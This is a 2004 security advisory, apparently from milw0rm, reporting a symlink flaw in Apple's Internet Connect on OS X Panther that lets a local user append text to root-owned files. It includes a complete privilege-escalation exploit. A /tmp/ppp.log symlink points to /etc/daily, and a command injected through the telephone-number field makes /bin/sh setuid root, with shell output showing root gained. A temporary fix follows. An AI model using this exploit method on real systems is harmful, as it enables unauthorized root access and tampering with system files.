@@ -1,0 +1,189 @@
+Date: 25.07.2004
+Author: B-r00t. 2004.
+Email: B-r00t <br00t blueyonder co uk>
+
+Vendor: Apple
+
+Operating
+System: OSX Panther (Possibly Previous Versions).
+
+Application: Internet Connect.app
+
+Tested: Panther 10.3.4 (Internet Connect v1.3)
+
+Problem: Internet Connect allows any file on the file
+system to be altered.
+
+Status: 0day! - Temporary Fix Included.
+
+Description:
+Apples Internet Connect application creates a
+'ppp.log' file in '/tmp/'. If the file already
+exists it is opened in append mode. If it does
+not exist a new file is created.
+
+It is possible to trick Internet Connect into
+appending data to any file on the filesystem by
+creating a symlink file '/tmp/ppp.log' pointing
+to the file to be altered.
+
+If the file '/tmp/ppp.log' already exists, the
+attack is not possible as the file is owned by
+user 'root' and group 'wheel': -
+
+$ ls -l /tmp/ppp.log
+-rw-r--r-- 1 root wheel 807 24 Jul 23:44 /tmp/ppp.log
+
+However, due to the Operating System clearing the
+'/tmp' directory during system startup and also on
+a regular basis due to system maintenance, it
+becomes possible to form the attack as shown below:
+
+First a file is created to represent a system file,
+owned and only writable by user 'root'.
+
+maki:~ # echo "TEST" > /etc/file_owned_by_root
+
+maki:~ # ls -l /etc/file_owned_by_root
+-rw-r--r-- 1 root wheel 5 25 Jul 00:09 /etc/
+file_owned_by_root
+
+maki:~ # cat /etc/file_owned_by_root
+TEST
+
+A symlink is now created in the '/tmp' directory to
+point to the file to be altered. It is important to
+realise that the link can be created as a none 'admin'
+or 'root' user.
+
+maki:/tmp $ id
+uid=502(br00t) gid=502(br00t) groups=502(br00t)
+
+maki:/tmp $ ln -s /etc/file_owned_by_root ppp.log
+
+maki:/tmp $ ls -l ./ppp.log
+lrwxr-xr-x 1 root wheel 23 25 Jul 00:11 ./ppp.log@ -> /
+etc/file_owned_by_root
+
+Now Internet Connect is opened. Under 'configuration'
+choose 'Other'. Enter some text into the 'Telephone
+Number' box (B-r00t r0x y3r w0rld!) and click 'Connect'.
+
+'Cancel' can be clicked several seconds later.
+
+Checking the original file '/etc/file_owned_by_root'
+we see the following: -
+
+maki:~ $ cat /etc/file_owned_by_root
+TEST
+Sun Jul 25 00:20:42 2004 : Version 2.0
+Sun Jul 25 00:20:43 2004 : Dialing B-r00t r0x y3r w0rld!
+Sun Jul 25 00:20:54 2004 : Terminating on signal 15.
+Sun Jul 25 00:20:58 2004 : Serial link disconnected.
+
+As can be seen, data has been appended to the 'protected'
+file.
+
+Impact: It is possible for a local user to escalate their
+privileges by appending data to specific system files.
+In addition, a malicious user may be able to render the
+machine unusable by corrupting important system files.
+
+Exploit: This demonstration appends commands to the '/etc/daily'
+file which is executed by default at 3:15AM each day.
+An alternative attack might involve appending to any
+of the files that are sourced at system start up such
+as '/etc/rc.common'. This latter method is convenient
+if the user is able to reboot the machine.
+
+Create our link
+maki:~ $ ln -s /etc/daily /tmp/ppp.log
+
+Open Internet Connect.
+Internal Modem -> Configuration -> Other
+
+Internet Connect only allows certain characters to be
+used for the telephone number. The background '&'
+character allows our command string to execute amongst
+the time and date strings also appended.
+
+Telephone Number:
+& cd .. && cd .. && cd .. && cd .. && cd bin && chmod 4755 
+sh &
+
+Click 'Connect' ...*wait (10secs) ... 'Cancel'
+
+Check the '/etc/daily' file.
+maki:~ $ tail /etc/daily
+if [ -f /etc/security ]; then
+echo ""
+echo "Running security:"
+sh /etc/security 2>&1 | sendmail root
+fi
+
+Sun Jul 25 03:10:11 2004 : Version 2.0
+Sun Jul 25 03:10:11 2004 : Dialing & cd .. && cd .. && cd .. 
+&& cd .. && cd bin && chmod 4755 sh &
+Sun Jul 25 03:10:15 2004 : Terminating on signal 15.
+Sun Jul 25 03:10:17 2004 : Serial link disconnected.
+
+Now sit back and wait for cron to execute '/etc/daily' at 03:
+15AM.
+
+maki:~ $ date
+Sun Jul 25 03:13:43 CEST 2004
+
+maki:~ $ cd /bin
+
+maki:/bin $ ls -l sh
+-r-xr-xr-x 1 root wheel 603488 25 Jun 09:39 sh*
+
+maki:/bin $ date
+Sun Jul 25 03:15:50 CEST 2004
+
+maki:/bin $ ls -l sh
+-rwsr-xr-x 1 root wheel 603488 25 Jun 09:39 sh*
+
+maki:/bin $ sh
+
+maki:/bin # id
+uid=502(br00t) euid=0(root) gid=502(br00t) 
+groups=502(br00t)
+
+All thats left to do is clean up '/etc/daily' and remove the 
+link
+'/tmp/ppp.log' 
+
+FIX: The following commands serve to provide a temporary fix 
+until
+Apple release an official update.
+
+Open a terminal: /Applications/Utilities/Terminal.app
+Gain root access using 'sudo':
+
+maki:~ $ sudo sh
+Password:[YOUR PASSWORD]
+
+maki:~ # whoami
+root
+
+You can copy and paste the following commands: -
+
+/usr/bin/touch /tmp/ppp.log
+echo '/usr/bin/touch /tmp/ppp.log' >> /etc/daily
+echo '/usr/bin/touch /tmp/ppp.log' >> /etc/rc.common
+
+These commands ensure that a '/tmp/ppp.log' file is
+present to prevent a user from creating a link as shown
+above. Alternatively the line:
+
+/usr/bin/touch /tmp/ppp.log
+
+can be added to each file '/etc/daily' and '/etc/rc.common'
+manually using an editor and root privileges.
+
+Shoutz: Marshal-L, Ruxsaw, Haggis & Kraft.
+s1, Blex & the old #cheese posse (RIP).
+Maz ... Good Luck For The Wedding!
+
+# milw0rm.com [2004-07-28]
